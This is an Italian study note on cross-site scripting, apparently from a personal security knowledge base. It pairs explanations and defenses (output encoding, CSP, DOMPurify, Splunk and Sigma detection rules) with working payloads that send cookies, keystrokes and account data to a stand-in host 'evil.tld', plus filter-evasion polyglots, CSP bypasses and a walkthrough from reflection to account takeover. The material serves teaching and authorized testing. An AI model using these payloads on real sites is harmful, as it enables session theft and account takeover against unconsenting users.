---
tipo: concetto
tag: [web, owasp]
fase: 2
fonti: 8
aggiornato: 2026-06-26
stato: maturo
aliases: ["Cross-Site Scripting (XSS)", "XSS"]
---

# Cross-Site Scripting (XSS)

> **Nota etica**: praticare solo su ambienti autorizzati ([[PortSwigger Web Academy]], DVWA, TryHackMe, CTF). Su sistemi reali senza permesso è reato.

## In breve
L'**XSS** inietta **JavaScript** che il browser della vittima esegue **nel contesto del sito legittimo**. Lo script gira con l'origine della vittima → accede a cookie, `localStorage`, DOM, e può agire **a nome dell'utente**. Categoria **A03 - Injection** dell'[[OWASP Top 10]]. La radice: dati controllati dall'utente finiscono in una pagina **senza encoding adatto al contesto**.

> [!note] Numerazione OWASP 2025
> Nella bozza **OWASP Top 10:2025** l'XSS è classificato esplicitamente sotto **A05 Injection** (è un'injection lato client, HTML/JS context): stessa famiglia della [[SQL Injection]] e della [[Command Injection]].

> [!example] CVE e casi storici
> - **CVE-2024-4439** (WordPress core ≤ 6.5.1) — stored XSS via commenti/avatar block, milioni di siti esposti.
> - **Samy worm (2005)** — stored XSS su MySpace, si autopropagò a oltre **1 milione** di profili in 20 ore: l'esempio storico del potenziale di self-spreading dello stored XSS.

## I 3 tipi
1. **Reflected** — il payload è nella **richiesta** (parametro URL/form) e torna subito nella risposta. Non persiste: serve indurre la vittima a cliccare un link.
2. **Stored (Persistent)** — il payload è **salvato** sul server (commento, profilo, nome file) ed eseguito a ogni visualizzazione. Il più grave: colpisce chiunque apra la pagina.
3. **DOM-based** — l'iniezione avviene **interamente lato client**: JS dell'app legge una *source* controllabile e la scrive in un *sink* pericoloso, **senza passare dal server**.

### DOM XSS: sources e sinks
| Source (input) | Sink (esecuzione) |
|---|---|
| `location.hash`, `location.search`, `document.URL` | `element.innerHTML`, `document.write()` |
| `document.referrer`, `window.name` | `eval()`, `setTimeout(str)`, `location = ...` |
| `postMessage` | `jQuery $(...).html()` |

## Esempio 1 — Reflected → furto sessione
Pagina che riflette `q` senza encoding:
```
https://sito/cerca?q=<script>new Image().src='https://evil.tld/c?'+document.cookie</script>
```
La vittima apre il link → il cookie di sessione parte verso l'attaccante → **session hijacking**.

> [!warning] HttpOnly non chiude l'XSS
> Con `HttpOnly` il cookie non è leggibile da JS, ma l'attaccante può comunque **agire come la vittima** dal suo browser: cambiare email, fare richieste autenticate, rubare token CSRF dal DOM. L'XSS resta critico.

## Esempio 2 — Stored → worm/keylogger
Payload salvato in un commento:
```html
<script>
document.addEventListener('keydown', e =>
  navigator.sendBeacon('https://evil.tld/k', e.key));
</script>
```
Ogni visitatore della pagina logga i tasti verso l'attaccante.

## Esempio 3 — Contesti di iniezione e "breakout"
Il payload **dipende da dove** finisce l'input. Non basta `<script>`:
```html
<!-- contesto: testo HTML -->        <script>alert(1)</script>
<!-- contesto: attributo "..." -->   "><img src=x onerror=alert(1)>
<!-- contesto: dentro <script> -->   ';alert(1)//
<!-- contesto: href/URL -->          javascript:alert(1)
<!-- senza la parola script (filtri) -->
<svg onload=alert(1)>
<body onpopstate=alert(1)>
<input autofocus onfocus=alert(1)>
```

### Bypass di filtri comuni
- **Blacklist `<script>`** → usa event handler: `onerror`, `onload`, `onfocus`.
- **Filtro case-sensitive** → `<ScRiPt>`.
- **Encoding** → HTML entities, URL-encoding, `String.fromCharCode`, base64 + `atob()`.
- **Polyglot** (funziona in più contesti):
  ```
  jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
  ```

## Cosa può fare un attaccante
Furto cookie/token · azioni autenticate (CSRF "potenziato", bypassa i token perché legge il DOM) · keylogging · defacement · phishing in-page (form fasullo) · pivot col framework **BeEF** (hook del browser).

## Mitigazione e difesa (in ordine)
1. **Output encoding context-aware** — la difesa primaria. Codifica diversa per HTML body, attributo, JS, URL, CSS. Non esiste un encoding unico.
2. **Framework auto-escaping** (React `{}`, Angular, Vue) — sicuri di default; attenzione a `dangerouslySetInnerHTML` / `v-html` / `bypassSecurityTrust*`.
3. **Content Security Policy (CSP)** — `script-src 'self'` con **nonce** o **hash**; `strict-dynamic`. Riduce drasticamente l'impatto anche se l'XSS esiste.
4. **Sanitizzazione HTML** quando devi accettare markup: libreria **DOMPurify** (non regex fatte a mano).
5. **`HttpOnly`** sui cookie (limita il furto) + **`Secure`** + **`SameSite`**.
6. **Trusted Types** (browser moderni) per bloccare i sink DOM pericolosi.

## Lab consigliati
PortSwigger: *Reflected/Stored/DOM XSS*, *XSS contexts*, *CSP bypass*. DVWA XSS (low→high).

---

# Approfondimento operativo (livello esperto)

## Meccanismo interno — source → sink
L'XSS è un problema di **flusso di dati**: un *dato controllabile* (source) raggiunge un *punto di esecuzione* (sink) senza l'encoding adatto al contesto. La distinzione chiave:

- **Server-side XSS (reflected/stored)**: la source è la **richiesta HTTP** (parametro, header, cookie, body), il sink è la **resa HTML lato server**. La pagina arriva già avvelenata. Il fix è encoding in fase di template.
- **DOM-based XSS**: source e sink stanno **entrambi nel JS del client**. Il server non vede mai il payload (sta nel `#fragment`, mai inviato). Il parser HTML non c'entra: conta come il JS *manipola* la stringa.

**Catalogo source → sink (DOM):**

| Source (taint origin) | Sink (esecuzione) | Note |
|---|---|---|
| `location.hash` / `.search` / `.href` | `innerHTML`, `outerHTML`, `document.write` | il classico; `#` non lascia il browser |
| `document.referrer`, `window.name` | `eval`, `Function()`, `setTimeout(str)` | `window.name` persiste cross-origin |
| `postMessage` (`event.data`) | `el.insertAdjacentHTML`, `$().html()` | manca check di `event.origin` |
| `localStorage` / `sessionStorage` | `location = ...`, `src`/`href` assegnati | DOM **stored** XSS |
| `XMLHttpRequest`/`fetch` response | template literal in `innerHTML` | sink "framework" |

> [!note] jQuery sink storici
> `$(selector)` con `selector` controllabile è un sink: `$('#'+location.hash)` valuta HTML se l'hash inizia per `<`. `$.html()`, `$.append()`, `$.after()` sono tutti sink.

## CSP bypass — casi reali
La CSP limita *da dove* può caricarsi/eseguirsi script. Si aggira quando è scritta male:

| Debolezza CSP | Bypass |
|---|---|
| `script-src 'unsafe-inline'` | l'XSS inline funziona direttamente: la CSP non protegge nulla |
| Whitelist con CDN che ospita librerie | **gadget JSONP** o AngularJS su CDN whitelistata: `<script src="//whitelisted-cdn/angular.js"></script>` + template injection |
| `script-src 'self'` + endpoint che riflette JS | carica uno script *dallo stesso* origin: file upload `.js`, endpoint JSONP open redirect |
| `'strict-dynamic'` ma con un loader vulnerabile | uno script trusted che inietta `<script>` propaga la trust |
| Nessun `base-uri` | inietta `<base href>` per dirottare i path relativi degli script |
| Nessun `object-src 'none'` | `<object data="data:...">` / plugin |

> [!warning] `nonce` riusato o predicibile
> Un nonce CSP deve essere **per-risposta e casuale**. Se il server lo riusa o lo genera in modo predicibile, l'attaccante lo legge una volta e marca i propri `<script nonce=...>`. CSP bypassata.

## Esfiltrazione — oltre il cookie
```js
// 1. cookie non-HttpOnly (classico)
new Image().src='https://evil.tld/c?'+encodeURIComponent(document.cookie);

// 2. fetch keepalive (sopravvive al cambio pagina; payload nel body)
fetch('https://evil.tld/x',{method:'POST',keepalive:true,
  body:document.cookie+'|'+localStorage.token});

// 3. HttpOnly attivo → ruba ciò che JS PUÒ leggere: token CSRF/JWT nel DOM, poi agisci
fetch('/api/account').then(r=>r.text()).then(d=>
  navigator.sendBeacon('https://evil.tld/d', d));   // sessione "ride" sul browser vittima

// 4. esfiltrazione DNS (aggira egress filtering HTTP) — prefetch su sottodominio
let t=document.cookie.replace(/[^a-z0-9]/gi,'');
new Image().src='https://'+t.slice(0,60)+'.evil.tld/p';
```
> [!tip] HttpOnly non chiude l'XSS (richiamo)
> Anche senza leggere il cookie, dal browser vittima fai richieste autenticate, leggi risposte same-origin (incluso il token anti-CSRF) e agisci a suo nome. Vedi Esempio 1.

## Polyglot e filter evasion
Un **polyglot** è un payload che esegue in più contesti d'iniezione contemporaneamente (così non devi prima individuare il contesto):
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
**Evasione filtri, una tecnica per blocco:**

| Filtro | Bypass |
|---|---|
| Blacklist parola `script` | event handler: `<svg onload=...>`, `<img src=x onerror=...>`, `<body onpageshow=...>` |
| Strip di `<` `>` ma input in attributo | breakout attributo: `" autofocus onfocus=alert() x="` |
| Rimozione `()` | `onerror=alert\`1\`` (template literal), `onerror=throw onerror=alert,1` |
| Blocco `alert`/keyword | `top['al'+'ert'](1)`, `(alert)(1)`, `window[atob('YWxlcnQ=')](1)` |
| Encoding HTML applicato una volta | doppio encoding o entità in attributo evento (il parser decodifica) |
| Filtro rimuove `<script>` una volta (non ricorsivo) | `<scr<script>ipt>` → dopo la rimozione resta `<script>` |
| Lunghezza limitata | redirect a payload esterno: `<script src=//x.tld></script>` o `<base href>` |

## Walkthrough end-to-end — reflected → account takeover
1. **Trova il reflection.** Inietta un marker unico `zqx123` in ogni parametro/header. Cerca `zqx123` raw nella risposta → punto candidato.
2. **Identifica il contesto.** Dove esce il marker? HTML body / attributo / dentro `<script>` / URL. Determina il breakout (vedi Esempio 3).
3. **Costruisci il PoC minimale.** Prima `alert(document.domain)` per provare l'esecuzione *nell'origin giusto* (non `alert(1)`: `document.domain` conferma il contesto).
4. **Verifica la CSP.** Leggi l'header `Content-Security-Policy`. Se presente, scegli il bypass adatto (tabella sopra) o ripiega su esfiltrazione senza inline.
5. **Weaponize.** Payload che chiama `/api/account/email` cambiando l'email su un dominio controllato → reset password → takeover. Oppure esfiltra il token di sessione.
6. **Delivery.** Reflected = link malevolo (URL-encoda il payload) inviato via phishing; il `Referer`/`utm` plausibile riduce il sospetto.

## OPSEC e limiti
- `alert()` è rumoroso e bloccato da alcuni framework di test: per PoC discreti usa `console.log` o un beacon silenzioso.
- Il **collaborator/beacon endpoint** rivela il tuo dominio: nei test autorizzati usa un dominio del lab, non infrastruttura riconducibile.
- DOM XSS via `#fragment` **non lascia tracce nei log server** (il fragment non viene inviato): ottimo per l'attaccante, ma significa che la detection deve stare lato client (RUM/CSP report), non sui log web.
- Limite: SameSite=Strict + HttpOnly + CSP con nonce robusta riducono molto l'impatto; un XSS può restare confermabile ma poco "armabile".

## Detection engineering
**Sorgenti:** access log (reflected: payload nel query string), **CSP report-uri/report-to** (violazioni = tentativi di esecuzione bloccati), WAF, e logging applicativo dell'input salvato (stored).

**Splunk (reflected nei log):**
```spl
index=web sourcetype=access_combined
| eval q=urldecode(uri_query)
| regex q="(?i)(<script|onerror=|onload=|javascript:|<svg|<img[^>]+src=x)"
| stats count by src_ip, uri_path, q
```
**CSP come sensore** (difensivo, ad alto segnale): `Content-Security-Policy-Report-Only` con `report-to` cattura ogni inline script bloccato → i report contengono `blocked-uri`/`script-sample`.

**Regola Sigma:**
```yaml
title: Pattern XSS riflesso nei parametri HTTP
logsource: { category: webserver }
detection:
  sel:
    cs-uri-query|contains:
      - '<script'
      - 'onerror='
      - 'onload='
      - 'javascript:'
      - '<svg'
      - 'document.cookie'
  condition: sel
falsepositives: [ WYSIWYG / campi che accettano HTML legittimo ]
level: medium
```
**MITRE ATT&CK:** **T1059.007** — Command and Scripting Interpreter: JavaScript. In catena di phishing: **T1189** (Drive-by Compromise).

## Troubleshooting (5 errori comuni)
1. **Il marker appare ma il payload non esegue** → contesto sbagliato: sei in un attributo o dentro `<script>` e serve un breakout, non `<script>` nudo. Rileggi *dove* esce il marker.
2. **Funziona in Repeater ma non nel browser** → encoding di trasporto: il browser ricodifica caratteri o tratta `#` come fragment. URL-encoda il payload; ricorda che il fragment non arriva al server (è normale per DOM XSS).
3. **CSP blocca tutto** → controlla `unsafe-inline`/nonce; se non bypassabile, ripiega su un vettore consentito (script same-origin) o documenta come "mitigato".
4. **`innerHTML` non esegue il mio `<script>`** → `innerHTML` **non** esegue tag `<script>` inseriti a runtime (specifica HTML). Usa `<img onerror>`/`<svg onload>` che eseguono comunque.
5. **Payload spezzato da auto-sanitizzazione del framework** → React/Angular escapano di default; cerca i sink espliciti (`dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrust*`) o un sink DOM, altrimenti non c'è XSS.

## Domande da colloquio
**D: Differenza tra reflected, stored e DOM-based a livello di flusso dati?**
R: Reflected e stored sono server-side: la source è la richiesta, il sink è la resa HTML server (reflected torna subito, stored è persistito e ricolpisce). DOM-based è interamente client: source e sink sono nel JS, il server non vede il payload (spesso nel fragment).

**D: HttpOnly mi protegge dall'XSS?**
R: No, mitiga solo il furto del cookie via JS. L'attaccante agisce comunque dal browser vittima: richieste autenticate, lettura di risposte same-origin, furto del token CSRF dal DOM. L'XSS resta critico.

**D: Come bypasseresti una CSP `script-src 'self'`?**
R: Cerco un modo di eseguire script *dallo stesso origin*: file upload servito come JS, endpoint JSONP, gadget in una libreria già whitelistata, o `<base href>` se manca `base-uri`. Se c'è `unsafe-inline` la CSP è già inefficace.

**D: Perché l'output encoding deve essere context-aware?**
R: Lo stesso carattere è pericoloso o innocuo a seconda del contesto: `"` rompe un attributo ma non il body HTML; `</script>` rompe un blocco JS. Un encoding unico o copre troppo (rompe l'output) o troppo poco (lascia il buco). Servono encoder distinti per HTML, attributo, JS, URL, CSS.

## Collegamenti
- [[OWASP Top 10]]
- [[Cookie e JWT]] — cosa l'XSS ruba o aggira (HttpOnly, SameSite)
- [[Cross-Site Request Forgery (CSRF)]] — l'XSS bypassa le difese CSRF
- [[Security Misconfiguration]] — header CSP / X-Frame-Options
- [[Clickjacking]] — attacco client-side affine (X-Frame-Options / CSP frame-ancestors)
- [[CORS Misconfiguration]] — un CORS lasco amplifica l'esfiltrazione via XSS
- [[Autenticazione e Gestione Sessioni]]
- [[Burp Suite]] — trovare e raffinare payload
- [[PortSwigger Web Academy]]

## Fonti
- PortSwigger — Cross-site scripting: https://portswigger.net/web-security/cross-site-scripting
- PortSwigger — XSS cheat sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- OWASP — XSS: https://owasp.org/www-community/attacks/xss/
- OWASP — XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- PortSwigger — Content Security Policy (bypass): https://portswigger.net/web-security/cross-site-scripting/content-security-policy
- Google CSP Evaluator / csp-bypass gadgets: https://csp-evaluator.withgoogle.com/
- MITRE ATT&CK — T1059.007 JavaScript: https://attack.mitre.org/techniques/T1059/007/
